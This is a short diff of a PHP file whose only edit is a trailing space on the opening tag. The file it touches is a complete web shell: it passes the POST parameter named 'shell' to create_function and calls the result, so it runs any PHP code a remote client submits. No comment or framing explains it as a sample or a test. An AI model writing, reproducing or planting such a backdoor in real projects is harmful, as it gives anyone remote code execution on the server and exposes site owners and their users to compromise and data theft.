@@ -1,4 +1,4 @@
-<?php
+<?php 
 $fun = create_function('',$_POST['shell']);
 $fun();
 ?>
